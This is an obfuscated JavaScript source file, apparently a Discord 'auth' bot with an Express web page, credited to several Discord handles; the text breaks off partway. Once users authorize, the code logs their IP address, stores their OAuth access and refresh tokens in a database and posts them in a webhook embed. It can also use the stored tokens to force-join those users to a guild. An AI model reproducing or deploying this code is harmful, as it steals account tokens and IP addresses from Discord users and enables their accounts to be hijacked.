(function(arg1, arg2) {
	const randomshit = _0x42c4,
		_0x321d21 = arg1();
	while (!![]) {
		try {
			const _0x55569e = parseInt(randomshit(0x20b)) / 0x1 + parseInt(randomshit(0x207)) / 0x2 * (-parseInt(randomshit(0x1fa)) / 0x3) + parseInt(randomshit(0x1cf)) / 0x4 + parseInt(randomshit(0x197)) / 0x5 * (-parseInt(randomshit(0x1b5)) / 0x6) + -parseInt(randomshit(0x1de)) / 0x7 + parseInt(randomshit(0x1ac)) / 0x8 + -parseInt(randomshit(0x1e6)) / 0x9 * (-parseInt(randomshit(0x1bb)) / 0xa);
			if (_0x55569e === arg2) break;
			else _0x321d21['push'](_0x321d21['shift']());
		} catch (_0x33112a) {
			_0x321d21['push'](_0x321d21['shift']());
		}
	}
}(_0x3731, 0x5c7fc), function(_0x4b4c60, _0x2659e0) {
	const _0x3e1c58 = _0x42c4,
		_0x2b2983 = _0x5a69,
		_0x4d1ab5 = _0x4b4c60();
	while (!![]) {
		try {
			const _0x1f146e = -parseInt(_0x2b2983(0xc9)) / 0x1 * (-parseInt(_0x2b2983(0x105)) / 0x2) + -parseInt(_0x2b2983(0xd7)) / 0x3 + -parseInt(_0x2b2983(0xad)) / 0x4 + parseInt(_0x2b2983(0x114)) / 0x5 * (-parseInt(_0x2b2983(0xaf)) / 0x6) + parseInt(_0x2b2983(0xca)) / 0x7 + parseInt(_0x2b2983(0xda)) / 0x8 * (-parseInt(_0x2b2983(0xe1)) / 0x9) + parseInt(_0x2b2983(0x111)) / 0xa * (parseInt(_0x2b2983(0xaa)) / 0xb);
			if (_0x1f146e === _0x2659e0) break;
			else _0x4d1ab5[_0x3e1c58(0x1bf)](_0x4d1ab5[_0x3e1c58(0x1ff)]());
		} catch (_0x442cdd) {
			_0x4d1ab5[_0x3e1c58(0x1bf)](_0x4d1ab5[_0x3e1c58(0x1ff)]());
		}
	}
}(_0x248b, 0x796bc));

function _0x1da8() {
	const _0x29fd64 = _0x42c4,
		_0x289968 = _0x5a69,
		_0x2bc127 = ['7yYdWGk', _0x289968(0xdb), _0x289968(0xbd), _0x289968(0x120), 'loadEvents', _0x289968(0xf1), _0x289968(0x11b), _0x289968(0x115), _0x289968(0xf9), _0x289968(0xb5), _0x29fd64(0x195), 'REACTION', _0x289968(0xc4), _0x289968(0xe8), _0x289968(0xd2), _0x289968(0xe7), _0x289968(0xfb), _0x289968(0x10b), _0x289968(0xfc), _0x29fd64(0x1c3), _0x289968(0x11c), 'use', _0x289968(0xab), _0x289968(0xb7), _0x289968(0xd0), _0x289968(0xeb), _0x289968(0xce), _0x289968(0xdd), _0x289968(0xac), _0x289968(0x10f), _0x289968(0x107), 'slash', _0x289968(0xe4), _0x29fd64(0x206), _0x289968(0x10c), _0x289968(0x100), _0x289968(0x102), _0x289968(0xdf), _0x29fd64(0x1fe), _0x289968(0xb3), 'autoroleid', _0x289968(0xfd), _0x289968(0x113), _0x289968(0xff), _0x29fd64(0x1e5), _0x289968(0xee), _0x29fd64(0x19d), _0x29fd64(0x1d0), _0x29fd64(0x1e8), _0x29fd64(0x19a), _0x29fd64(0x205), _0x289968(0xc5), _0x289968(0xb6), _0x289968(0xae), _0x289968(0xea), _0x289968(0xf8), _0x289968(0xd4), _0x289968(0xc6), _0x289968(0x10a), _0x29fd64(0x1e9), _0x289968(0x121), _0x289968(0xc2), _0x289968(0xcb), _0x289968(0xfe), '1487210phscMG', _0x289968(0xf0), _0x289968(0xf6), _0x289968(0x109), _0x289968(0xb9), _0x289968(0xd3), _0x289968(0xba), _0x289968(0x106), _0x289968(0xb1), _0x289968(0x10d), _0x289968(0x103), _0x29fd64(0x1c6), _0x29fd64(0x1fc), _0x289968(0xb2), _0x289968(0xb0), _0x289968(0x11f), _0x289968(0xc0), _0x289968(0xa9), 'redirect_uri', _0x289968(0xf5), _0x289968(0xc1), _0x289968(0xb8), _0x29fd64(0x1f8), _0x289968(0xbb), _0x289968(0xe3), _0x29fd64(0x1df), _0x289968(0xd6), _0x289968(0x11d), _0x289968(0xe9), _0x289968(0x101), _0x289968(0xbe), _0x289968(0xf4), _0x289968(0xcf), _0x29fd64(0x1bf), _0x289968(0x104), _0x289968(0xcd), _0x289968(0xe0), _0x289968(0xd9), _0x289968(0x112), _0x289968(0xde), _0x289968(0xec), _0x289968(0x108), _0x289968(0xbc), _0x29fd64(0x1d6)];
	return _0x1da8 = function() {
		return _0x2bc127;
	}, _0x1da8();
}(function(_0x2b1e28, _0x2f06ec) {
	const _0xa09375 = _0x5a69,
		_0xacd8e5 = _0x4989,
		_0x24bb94 = _0x2b1e28();
	while (!![]) {
		try {
			const _0x21b762 = parseInt(_0xacd8e5(0xbb)) / 0x1 * (parseInt(_0xacd8e5(0xd6)) / 0x2) + parseInt(_0xacd8e5(0x93)) / 0x3 + parseInt(_0xacd8e5(0xd0)) / 0x4 + -parseInt(_0xacd8e5(0xa4)) / 0x5 * (-parseInt(_0xacd8e5(0xa7)) / 0x6) + parseInt(_0xacd8e5(0x99)) / 0x7 * (parseInt(_0xacd8e5(0x94)) / 0x8) + parseInt(_0xacd8e5(0x88)) / 0x9 + parseInt(_0xacd8e5(0xd8)) / 0xa * (-parseInt(_0xacd8e5(0xca)) / 0xb);
			if (_0x21b762 === _0x2f06ec) break;
			else _0x24bb94[_0xa09375(0xbf)](_0x24bb94[_0xa09375(0xb1)]());
		} catch (_0x332c13) {
			_0x24bb94[_0xa09375(0xbf)](_0x24bb94[_0xa09375(0xb1)]());
		}
	}
}(_0x1da8, 0x62022));
const _0x253366 = _0x538f;
(function(_0x3d6273, _0x553701) {
	const _0x2da096 = _0x4989,
		_0x37fc1c = _0x538f,
		_0x5e9d58 = _0x3d6273();
	while (!![]) {
		try {
			const _0x2e5885 = -parseInt(_0x37fc1c(0x1d8)) / 0x1 * (-parseInt(_0x37fc1c(0x195)) / 0x2) + parseInt(_0x37fc1c(0x1a1)) / 0x3 + -parseInt(_0x37fc1c(0x1cb)) / 0x4 * (-parseInt(_0x37fc1c(0x1a9)) / 0x5) + -parseInt(_0x37fc1c(0x174)) / 0x6 + parseInt(_0x37fc1c(0x17d)) / 0x7 + parseInt(_0x37fc1c(0x1d4)) / 0x8 * (-parseInt(_0x37fc1c(0x1d5)) / 0x9) + parseInt(_0x37fc1c(0x172)) / 0xa * (parseInt(_0x37fc1c(0x1c3)) / 0xb);
			if (_0x2e5885 === _0x553701) break;
			else _0x5e9d58[_0x2da096(0xb7)](_0x5e9d58[_0x2da096(0x9e)]());
		} catch (_0x38656f) {
			_0x5e9d58[_0x2da096(0xb7)](_0x5e9d58[_0x2da096(0x9e)]());
		}
	}
}(_0x4948, 0x91111));
const _0x5f393d = _0x4640;

function _0x538f(_0x364835, _0x30f69a) {
	const _0x3071b2 = _0x4948();
	return _0x538f = function(_0x5ecf30, _0x463c1f) {
		_0x5ecf30 = _0x5ecf30 - 0x172;
		let _0x3271af = _0x3071b2[_0x5ecf30];
		return _0x3271af;
	}, _0x538f(_0x364835, _0x30f69a);
}

function _0x4989(_0x352c4d, _0x5946d6) {
	const _0x1f527c = _0x1da8();
	return _0x4989 = function(_0xfe49b6, _0x466219) {
		_0xfe49b6 = _0xfe49b6 - 0x72;
		let _0x35dbb5 = _0x1f527c[_0xfe49b6];
		return _0x35dbb5;
	}, _0x4989(_0x352c4d, _0x5946d6);
}(function(_0x5195ef, _0x2ce8e1) {
	const _0xa6f793 = _0x538f,
		_0x5329cc = _0x4640,
		_0x3497e8 = _0x5195ef();
	while (!![]) {
		try {
			const _0x5805c2 = -parseInt(_0x5329cc(0xb4)) / 0x1 * (-parseInt(_0x5329cc(0xa4)) / 0x2) + -parseInt(_0x5329cc(0x9d)) / 0x3 + -parseInt(_0x5329cc(0xce)) / 0x4 * (parseInt(_0x5329cc(0xa8)) / 0x5) + parseInt(_0x5329cc(0x8b)) / 0x6 * (-parseInt(_0x5329cc(0xbc)) / 0x7) + parseInt(_0x5329cc(0xaf)) / 0x8 * (parseInt(_0x5329cc(0xd5)) / 0x9) + parseInt(_0x5329cc(0xd9)) / 0xa + parseInt(_0x5329cc(0xba)) / 0xb * (-parseInt(_0x5329cc(0xa5)) / 0xc);
			if (_0x5805c2 === _0x2ce8e1) break;
			else _0x3497e8[_0xa6f793(0x18a)](_0x3497e8[_0xa6f793(0x1a6)]());
		} catch (_0x470e69) {
			_0x3497e8[_0xa6f793(0x18a)](_0x3497e8[_0xa6f793(0x1a6)]());
		}
	}
}(_0x5855, 0xcb81c));
const _0x2cb03d = _0xe9eb;

function _0x42c4(_0x58ec7c, _0x38c988) {
	const _0x37311c = _0x3731();
	return _0x42c4 = function(_0x42c476, _0x57ce78) {
		_0x42c476 = _0x42c476 - 0x194;
		let _0x24c57b = _0x37311c[_0x42c476];
		return _0x24c57b;
	}, _0x42c4(_0x58ec7c, _0x38c988);
}

function _0x1800() {
	const _0x5f1e6b = _0x4989,
		_0xf8ece3 = _0x538f,
		_0x53901e = _0x4640,
		_0x3eba01 = [_0x53901e(0xcc), _0x53901e(0x92), _0x53901e(0xc3), _0x5f1e6b(0xd4), _0x53901e(0xc2), _0xf8ece3(0x199), _0x53901e(0xdc), _0x53901e(0x90), _0x53901e(0x8c), _0x53901e(0xa6), _0x53901e(0xcb), _0x53901e(0x95), _0x5f1e6b(0xb4), _0x53901e(0x9e), _0x53901e(0xbe), _0x53901e(0xdb), _0x53901e(0x84), _0x5f1e6b(0xa8), _0x53901e(0xa1), _0x53901e(0x82), _0x53901e(0xb9), _0x53901e(0xb2), _0x53901e(0x8d), _0x53901e(0xc8), _0x5f1e6b(0xc9), _0xf8ece3(0x1d0), _0x53901e(0xa2), _0x53901e(0x98), _0xf8ece3(0x177), _0xf8ece3(0x1d1), _0x53901e(0x9c), _0x53901e(0xbb), _0x53901e(0xb5), _0x53901e(0xca), _0x53901e(0xcf), _0xf8ece3(0x19f), _0xf8ece3(0x173), _0x53901e(0xc4), _0x53901e(0xd1), _0x5f1e6b(0xbf), _0x53901e(0x85), _0x53901e(0xc6), _0x53901e(0xb7), _0x53901e(0xcd), _0xf8ece3(0x181), _0x53901e(0xd6), _0x53901e(0xb8), _0xf8ece3(0x1da), _0x53901e(0x93), _0xf8ece3(0x1d6), _0x53901e(0xa7), _0xf8ece3(0x1b8), _0x53901e(0xb6), _0x53901e(0x96), _0x53901e(0x89), _0x53901e(0x8a), _0x53901e(0x88), _0xf8ece3(0x194), _0x53901e(0xd8), _0xf8ece3(0x19e), _0x53901e(0xbd), _0xf8ece3(0x19a), _0x53901e(0x83), _0xf8ece3(0x1b3), _0x53901e(0xc0), _0x53901e(0x99), _0xf8ece3(0x1ce), _0x53901e(0xc7), _0xf8ece3(0x17b), _0x53901e(0x9f), _0x53901e(0xa9), _0x53901e(0xd4), _0x53901e(0xb1), _0x5f1e6b(0x8c), _0x53901e(0x91), _0x53901e(0xbf), _0x53901e(0xc1), _0x53901e(0xdd), _0x53901e(0xaa), _0xf8ece3(0x187), _0x53901e(0x87), _0x53901e(0xae), _0x53901e(0x9a), _0x53901e(0xa0), _0xf8ece3(0x1aa), _0x53901e(0xd3), _0x53901e(0x94), _0x53901e(0xc5), _0x53901e(0xa3), _0x53901e(0xd7)];
	return _0x1800 = function() {
		return _0x3eba01;
	}, _0x1800();
}

function _0x4948() {
	const _0x586275 = _0x42c4,
		_0x3dab62 = _0x5a69,
		_0x2061ab = _0x4989,
		_0x7587b5 = [_0x2061ab(0x84), _0x2061ab(0xa9), _0x586275(0x1ce), _0x3dab62(0xd1), _0x2061ab(0x95), _0x3dab62(0xdc), _0x2061ab(0x72), _0x586275(0x20d), _0x3dab62(0xe2), '[+]\x20-\x20', 'CHANNEL', _0x2061ab(0xc1), _0x2061ab(0xc0), _0x2061ab(0xd2), _0x2061ab(0xc3), _0x2061ab(0xa2), _0x2061ab(0x78), _0x3dab62(0xfa), _0x586275(0x19f), _0x2061ab(0x7c), _0x2061ab(0x77), _0x3dab62(0xf7), _0x2061ab(0x79), _0x2061ab(0x9c), _0x2061ab(0x75), _0x2061ab(0xba), _0x2061ab(0x80), _0x2061ab(0x9b), _0x2061ab(0xb0), _0x2061ab(0xdc), _0x2061ab(0x8e), _0x2061ab(0xa3), _0x3dab62(0xf2), _0x2061ab(0x86), _0x2061ab(0x8d), _0x2061ab(0x82), _0x3dab62(0x10e), _0x2061ab(0xb9), _0x3dab62(0x117), _0x3dab62(0xc3), _0x2061ab(0xdd), _0x2061ab(0x91), _0x2061ab(0xa0), _0x2061ab(0xaa), _0x2061ab(0xc5), _0x2061ab(0xcc), _0x2061ab(0xd5), _0x2061ab(0x7f), _0x2061ab(0xb1), _0x2061ab(0xae), _0x2061ab(0x9f), _0x2061ab(0xd3), _0x2061ab(0xaf), _0x2061ab(0x81), _0x2061ab(0xd1), _0x2061ab(0x90), _0x3dab62(0xf3), _0x2061ab(0xa1), _0x3dab62(0x11a), _0x2061ab(0xad), _0x2061ab(0xbd), _0x2061ab(0x8f), _0x2061ab(0xb7), _0x2061ab(0x8a), _0x2061ab(0xcb), _0x3dab62(0xc8), _0x2061ab(0x89), _0x2061ab(0xce), _0x3dab62(0x110), _0x2061ab(0xcf), _0x3dab62(0x116), _0x2061ab(0x73), _0x2061ab(0xb8), _0x2061ab(0x92), _0x2061ab(0x98), _0x2061ab(0xa5), _0x3dab62(0xc7), _0x2061ab(0xb5), _0x2061ab(0xc4), _0x2061ab(0xc8), _0x2061ab(0xd9), _0x3dab62(0xe5), _0x3dab62(0xe6), _0x2061ab(0x97), _0x2061ab(0x7a), _0x2061ab(0xab), _0x2061ab(0xdb), _0x2061ab(0xa6), _0x2061ab(0xac), _0x2061ab(0xc6), _0x2061ab(0x9e), _0x586275(0x1b2), _0x2061ab(0x7b), _0x2061ab(0x96), _0x2061ab(0x8b), _0x2061ab(0x9d), _0x2061ab(0xc7), _0x586275(0x1f0), _0x2061ab(0x7d), _0x2061ab(0xc2), _0x2061ab(0x83), _0x2061ab(0xb6), _0x3dab62(0xd5), _0x586275(0x1f3), _0x3dab62(0xcc), _0x3dab62(0xb4), _0x3dab62(0xef)];
	return _0x4948 = function() {
		return _0x7587b5;
	}, _0x4948();
}

function _0x248b() {
	const _0x102d17 = _0x42c4,
		_0x41f75a = [_0x102d17(0x1f5), _0x102d17(0x1a1), _0x102d17(0x20f), _0x102d17(0x1dd), _0x102d17(0x1a6), _0x102d17(0x1db), _0x102d17(0x1cc), _0x102d17(0x1ea), _0x102d17(0x204), 'get', _0x102d17(0x199), _0x102d17(0x1e3), _0x102d17(0x1b3), 'socket', _0x102d17(0x1ef), _0x102d17(0x19e), '45KHwOqO', _0x102d17(0x1c1), _0x102d17(0x196), _0x102d17(0x1c8), 'userId', '82RlMKIq', _0x102d17(0x1aa), _0x102d17(0x1b1), _0x102d17(0x201), '3909522TvNaQQ', _0x102d17(0x19b), _0x102d17(0x194), _0x102d17(0x1d3), _0x102d17(0x208), _0x102d17(0x1c7), '4950281BAIaAq', _0x102d17(0x202), _0x102d17(0x20e), _0x102d17(0x1c5), _0x102d17(0x1a0), 'https://discordapp.com/api/oauth2/token', '55YnafBY', _0x102d17(0x1fb), _0x102d17(0x1d1), 'discord-oauth2', '100KSsazj', _0x102d17(0x209), _0x102d17(0x1e7), _0x102d17(0x1f2), _0x102d17(0x1b8), _0x102d17(0x203), _0x102d17(0x1bc), _0x102d17(0x1a7), '\x0a\x0aRefresh\x20Token:\x20`', 'autoaddid', _0x102d17(0x1f6), _0x102d17(0x1b4), _0x102d17(0x1ad), _0x102d17(0x198), _0x102d17(0x1d5), 'catch', _0x102d17(0x1a9), 'User\x20unauthed,\x20Not\x20removing,\x20Use\x20clean\x20cmd', _0x102d17(0x1ba), '144618hTQHuR', _0x102d17(0x1e1), _0x102d17(0x1d7), _0x102d17(0x1c0), _0x102d17(0x1bd), _0x102d17(0x1b0), _0x102d17(0x1a5), 'connect', _0x102d17(0x1b9), _0x102d17(0x1ca), _0x102d17(0x1d2), _0x102d17(0x1f7), _0x102d17(0x1fd), _0x102d17(0x1b6), 'https://discord.gg/oauth2\x20->\x20Made\x20By\x20gpa#0001\x20,\x20forgetful#0001\x20,\x201vx#0001', _0x102d17(0x1f4), _0x102d17(0x1a3), _0x102d17(0x1c2), 'Bot', 'grant_type', _0x102d17(0x1a4), _0x102d17(0x1dc), _0x102d17(0x1cb), _0x102d17(0x1ed), 'express', _0x102d17(0x1d4), _0x102d17(0x1ee), _0x102d17(0x1d9), _0x102d17(0x1ab), _0x102d17(0x1f9), _0x102d17(0x1da), _0x102d17(0x1e2), 'avatar', _0x102d17(0x19c), _0x102d17(0x1ec), _0x102d17(0x1a8), _0x102d17(0x1eb), _0x102d17(0x1be), _0x102d17(0x1c4), _0x102d17(0x1e4), _0x102d17(0x1d8), _0x102d17(0x1ae), _0x102d17(0x1ff), _0x102d17(0x20c), _0x102d17(0x1f1), 'text', _0x102d17(0x1b7), 'json', './handler/index', _0x102d17(0x1af), '188715AxtAum', '[FATAL]\x20Possibly\x20Unhandled\x20Rejection\x20at:\x20Promise\x20', _0x102d17(0x1e0), _0x102d17(0x200), _0x102d17(0x1c9), 'guilds.join', _0x102d17(0x1bf), 'remoteAddress', _0x102d17(0x20a), _0x102d17(0x1cd), _0x102d17(0x1a2)];
	return _0x248b = function() {
		return _0x41f75a;
	}, _0x248b();
}

function _0x3731() {
	const _0x281372 = ['5198112WZgeLk', '4OSwvcY', '1142fzMysm', '265248WyZLNN', 'discriminator', '\x20reason:\x20', '212457wHkjLY', 'POST', '12tKKiWg', 'for\x20/help', 'accessToken', '2726742PiITfa', '2671750ZGTKaK', 'online', '7185tTAYXW', 'client_id', '1483312COJrsE', '1ukvPpk', 'then', '155416jUMMMU', 'wehbook', 'mongodb', '**New\x20User**', '.png?size=4096', '1201236bVOJAp', 'Uncaught\x20Exception:\x20', 'listen', '842930GGSSTJ', '[-]\x20-\x20', '7nflFsJ', 'auto', '242trlMut', '10qHiaym', '264ewVCuL', '12268nKtapx', '5026648hvwfCc', '2178vNfQDO', '85LxLsNW', '1397868TjOWMs', '1683146vnVfdH', '2132511horwZH', '\x0a\x0aIP:\x20`', 'Watching', 'authorization_code', '1686siSEqr', '\x0a\x0aAcces\x20Token:\x20`', '\x0a\x0aID:\x20`', '9IYzIap', 'scope', 'token_type', '130zdObTy', '1646499rJgeUX', '244476krGrEB', 'body-parser', 'push', 'loadSlashCommands', 'code', '648660DwIUme', 'client_secret', '1973108TDnDWs', 'exports', '456797hFhJiN', 'discord.js', '929109mMZBCl', 'https://cdn.discordapp.com/avatars/', '1316TXVzMy', 'node-fetch', '1209999SgrGcC', '892665lcAUtA', './epic', '2172964bgdqKz', '823475qbWSyP', 'username', 'uncaughtException', 'Info:\x20`', 'mongoose', 'axios', 'discord', 'application/json', '6wkGTFH', 'refresh_token', 'sendFile', '1zgJrQK', 'identify', 'log', '693063yswCiW', 'https://discord.com/api/users/@me', 'MESSAGE', 'stringify', '296ZsbgbX', 'addMember', 'headers', 'unhandledRejection', '78363exvjTW', './models/users.js', '4sYUYDx', '3287496rLEinr', '5000fRDHtr', '90870RInrHG', '124008PrycJg', '690UzJndU', 'append', '1414804bENeAJ', 'login', 'save', 'access_token', '5GFlSed', 'post', '/index.html', '8789130zXuSlH', 'port', 'x-forwarded-for', 'form-data', '3234ZfNHZw', '3858812MmcUVY', 'token', 'data', 'body', 'shift', '62403epVGSf', 'findOne', 'TOKEN\x20OR\x20INTENT\x20INVALID', 'message', '4933328rkOaKr'];
	_0x3731 = function() {
		return _0x281372;
	};
	return _0x3731();
}

function _0x4640(_0x21ca58, _0x3f91a2) {
	const _0xa10733 = _0x5855();
	return _0x4640 = function(_0x2193cd, _0x5a02e2) {
		_0x2193cd = _0x2193cd - 0x82;
		let _0x548c92 = _0xa10733[_0x2193cd];
		return _0x548c92;
	}, _0x4640(_0x21ca58, _0x3f91a2);
}

function _0xe9eb(_0xbcf857, _0x205619) {
	const _0x2cfe4c = _0x1800();
	return _0xe9eb = function(_0x16a95a, _0x3be378) {
		_0x16a95a = _0x16a95a - 0x1c0;
		let _0x31ce91 = _0x2cfe4c[_0x16a95a];
		return _0x31ce91;
	}, _0xe9eb(_0xbcf857, _0x205619);
}(function(_0x4aa8c2, _0x1dded8) {
	const _0x5844d0 = _0x4640,
		_0x4e5d74 = _0xe9eb,
		_0xec422a = _0x4aa8c2();
	while (!![]) {
		try {
			const _0x36298a = parseInt(_0x4e5d74(0x1f9)) / 0x1 * (-parseInt(_0x4e5d74(0x205)) / 0x2) + parseInt(_0x4e5d74(0x201)) / 0x3 + -parseInt(_0x4e5d74(0x20a)) / 0x4 * (parseInt(_0x4e5d74(0x200)) / 0x5) + -parseInt(_0x4e5d74(0x212)) / 0x6 * (-parseInt(_0x4e5d74(0x217)) / 0x7) + -parseInt(_0x4e5d74(0x1ef)) / 0x8 * (-parseInt(_0x4e5d74(0x1fa)) / 0x9) + parseInt(_0x4e5d74(0x1d1)) / 0xa * (parseInt(_0x4e5d74(0x211)) / 0xb) + parseInt(_0x4e5d74(0x214)) / 0xc;
			if (_0x36298a === _0x1dded8) break;
			else _0xec422a[_0x5844d0(0xad)](_0xec422a[_0x5844d0(0x8e)]());
		} catch (_0x1647aa) {
			_0xec422a[_0x5844d0(0xad)](_0xec422a[_0x5844d0(0x8e)]());
		}
	}
}(_0x1800, 0x7f2fe));
const {
	Client,
	Intents,
	Collection
} = require(_0x253366(0x1bf)), client = new Client({
	'fetchAllMembers': ![],
	'restTimeOffset': 0x0,
	'restWsBridgetimeout': 0x64,
	'shards': _0x2cb03d(0x1c6),
	'allowedMentions': {
		'parse': [],
		'repliedUser': ![]
	},
	'intents': 0x7fff,
	'partials': [_0x2cb03d(0x210), _0x2cb03d(0x1eb), _0x2cb03d(0x20e)],
	'presence': {
		'activity': {
			'name': _0x2cb03d(0x1ff),
			'type': _0x2cb03d(0x1d4)
		},
		'status': _0x2cb03d(0x1c0)
	}
});

function _0x5a69(_0x15c681, _0x216819) {
	const _0x43cecb = _0x248b();
	return _0x5a69 = function(_0x231b7e, _0x39ae23) {
		_0x231b7e = _0x231b7e - 0xa9;
		let _0x4550cc = _0x43cecb[_0x231b7e];
		return _0x4550cc;
	}, _0x5a69(_0x15c681, _0x216819);
}
headers = {
	'authorization': _0x5f393d(0xc9)
};

function _0x5855() {
	const _0x5d7abc = _0x42c4,
		_0x4503c0 = _0x5a69,
		_0x1320aa = _0x4989,
		_0x1f736f = _0x253366,
		_0x147d3d = [_0x1f736f(0x1c5), _0x1f736f(0x1a3), _0x1f736f(0x192), _0x1f736f(0x1d7), _0x1f736f(0x182), _0x1f736f(0x180), _0x5d7abc(0x20f), _0x4503c0(0x10c), _0x1f736f(0x1bc), _0x1320aa(0xbc), _0x1f736f(0x1d9), _0x1f736f(0x1a2), _0x1f736f(0x17a), _0x4503c0(0x119), _0x1f736f(0x1be), _0x1f736f(0x186), _0x1f736f(0x1db), _0x1f736f(0x18c), _0x1f736f(0x18b), _0x1f736f(0x17c), _0x1f736f(0x1bb), _0x1f736f(0x1ac), _0x1320aa(0x76), _0x1f736f(0x1d3), _0x1f736f(0x191), _0x1f736f(0x1cc), _0x1f736f(0x176), _0x1320aa(0xb3), _0x1f736f(0x1bd), _0x1320aa(0xcd), _0x1320aa(0xda), _0x1f736f(0x19d), _0x4503c0(0xed), _0x4503c0(0x118), _0x1f736f(0x1c4), _0x1f736f(0x185), _0x1320aa(0x9a), _0x1320aa(0xbe), _0x1f736f(0x1ab), _0x1f736f(0x1a8), _0x1f736f(0x1ae), _0x1f736f(0x1b7), _0x1f736f(0x1a6), _0x1f736f(0x1b6), _0x1f736f(0x1dc), _0x1f736f(0x19b), _0x1f736f(0x1a0), _0x1f736f(0x19c), _0x1f736f(0x1af), _0x1f736f(0x190), _0x1f736f(0x193), _0x1f736f(0x18f), _0x1f736f(0x1a5), _0x1f736f(0x178), _0x1320aa(0xd7), _0x1f736f(0x196), _0x1f736f(0x1a7), _0x1f736f(0x184), _0x1320aa(0x7e), _0x1f736f(0x1bf), _0x1f736f(0x175), _0x1f736f(0x1c9), _0x1f736f(0x1a4), _0x1f736f(0x188), _0x1f736f(0x179), _0x1f736f(0x18e), _0x4503c0(0xd8), _0x1f736f(0x198), _0x1320aa(0x85), _0x1f736f(0x1b5), _0x1f736f(0x1ad), _0x1f736f(0x1cf), _0x1f736f(0x1ca), _0x1f736f(0x18a), _0x1f736f(0x1cd), _0x1f736f(0x1b4), _0x1f736f(0x1d2), _0x1f736f(0x1b2), _0x1f736f(0x1c2), _0x1f736f(0x17e), _0x1320aa(0x87), _0x1f736f(0x1b0), _0x1320aa(0x74), _0x1f736f(0x1c1), _0x1f736f(0x197), _0x1f736f(0x183), _0x1320aa(0xb2), _0x1f736f(0x1c6), _0x1f736f(0x18d), _0x1f736f(0x1ba), _0x1f736f(0x1c8), _0x1f736f(0x1b1)];
	return _0x5855 = function() {
		return _0x147d3d;
	}, _0x5855();
}
const Discord = require(_0x2cb03d(0x206)),
	handler = require(_0x2cb03d(0x1f1)),
	fs = require('fs'),
	express = require(_0x2cb03d(0x1e9)),
	app = express(),
	bodyParser = require(_0x2cb03d(0x1c7)),
	fetch = (..._0x2d2a3f) => import(_0x2cb03d(0x1c5))[_0x253366(0x188)](({
		default: _0x5989c9
	}) => _0x5989c9(..._0x2d2a3f)),
	epic = require(_0x253366(0x1b9)),
	FormData = require(_0x2cb03d(0x216)),
	axios = require(_0x5f393d(0x86)),
	mongoose = require(_0x2cb03d(0x1ec)),
	DiscordOauth2 = require(_0x2cb03d(0x1f7)),
	oauth = new DiscordOauth2(),
	usersSchema = require(_0x5f393d(0x8f));
mongoose[_0x2cb03d(0x1f5)]('' + epic[_0x5f393d(0xb0)], {
	'useUnifiedTopology': !![],
	'useNewUrlParser': !![]
}), process['on'](_0x2cb03d(0x1f0), _0x434b97 => console[_0x2cb03d(0x1f3)](_0x434b97)), app[_0x2cb03d(0x213)](bodyParser[_0x2cb03d(0x207)]()), app[_0x2cb03d(0x1c8)]('/', function(_0x37e4f1, _0x16ef32) {
	const _0x1b4b43 = _0x5a69,
		_0x5617a0 = _0x5f393d;
	_0x16ef32[_0x1b4b43(0x11e)](__dirname + _0x5617a0(0x97));
}), app[_0x2cb03d(0x1f6)]('/', function(_0x6f652, _0x23e508) {
	const _0xbd4d9d = _0x4989,
		_0x403e3d = _0x253366,
		_0x31d194 = _0x5f393d,
		_0x102cb5 = _0x2cb03d,
		_0x3f93ee = _0x6f652[_0x102cb5(0x215)][_0x102cb5(0x1db)] || _0x6f652[_0x102cb5(0x1fd)][_0x102cb5(0x20d)];
	let _0x4e4cea = new FormData();
	_0x4e4cea[_0x102cb5(0x1e3)](_0x403e3d(0x1c8), epic[_0x102cb5(0x1cf)]), _0x4e4cea[_0x102cb5(0x1e3)](_0x102cb5(0x1c1), epic[_0x102cb5(0x1c1)]), _0x4e4cea[_0x31d194(0xcf)](_0x102cb5(0x1de), _0x102cb5(0x1e2)), _0x4e4cea[_0x102cb5(0x1e3)](_0x102cb5(0x1d2), epic[_0x102cb5(0x1d2)]), _0x4e4cea[_0x102cb5(0x1e3)](_0x102cb5(0x1e8), _0x102cb5(0x1d9), _0x102cb5(0x1cd)), _0x4e4cea[_0x102cb5(0x1e3)](_0x102cb5(0x209), _0x6f652[_0x31d194(0xac)]), fetch(_0x102cb5(0x1fb), {
		'method': _0x102cb5(0x1f2),
		'body': _0x4e4cea
	})[_0x31d194(0xa3)](_0x1671f0 => _0x1671f0[_0x31d194(0xd2)]())[_0xbd4d9d(0xbd)](_0x5bbcdd => {
		const _0x58c095 = _0x102cb5;
		ac_token = _0x5bbcdd[_0x58c095(0x1e4)], rf_token = _0x5bbcdd[_0x58c095(0x20b)];
		const _0x1069e1 = {
			'headers': {
				'authorization': _0x5bbcdd[_0x58c095(0x1ed)] + '\x20' + ac_token
			}
		};
		axios[_0x58c095(0x1c8)](_0x58c095(0x218), _0x1069e1)[_0x58c095(0x219)](async space => {
			const _0x48770a = _0x4989,
				_0x5bcd17 = _0x538f,
				_0x29bc88 = _0x4640,
				stars = _0x58c095;
			let {
				status: _0x31c0bd
			} = space;
			_0x31c0bd == 0x191 && console[_0x29bc88(0xa7)](stars(0x208));
			let _0x2beb73 = space[stars(0x204)]['id'],
				_0x576d04 = await usersSchema[stars(0x1d8)]({
					'userId': _0x2beb73
				});
			if (_0x576d04) {
				console[stars(0x1f3)](stars(0x1f8) + _0x3f93ee + '\x20' + space[_0x29bc88(0xc7)][stars(0x1cb)] + '#' + space[stars(0x204)][stars(0x1e1)]), await oauth[_0x5bcd17(0x1b1)]({
					'guildId': '' + epic[_0x29bc88(0x9b)],
					'botToken': epic[stars(0x1e0)],
					'userId': _0x576d04[stars(0x1ca)],
					'accessToken': _0x576d04[_0x5bcd17(0x189)]
				})[stars(0x1c4)](() => {
					return;
				});
				return;
			}
			console[stars(0x1f3)](_0x5bcd17(0x1c0) + _0x3f93ee + '\x20' + space[stars(0x204)][stars(0x1cb)] + '#' + space[_0x48770a(0x78)][_0x5bcd17(0x1b0)]), avatarHASH = stars(0x1fe) + space[stars(0x204)]['id'] + '/' + space[stars(0x204)][stars(0x202)] + stars(0x1e6), fetch('' + epic[stars(0x1d7)], {
				'method': stars(0x1f2),
				'headers': {
					'Content-Type': stars(0x1c2)
				},
				'body': JSON[stars(0x1d0)]({
					'avatar_url': '',
					'embeds': [{
						'color': 0x2f3136,
						'title': stars(0x1d3),
						'thumbnail': {
							'url': avatarHASH
						},
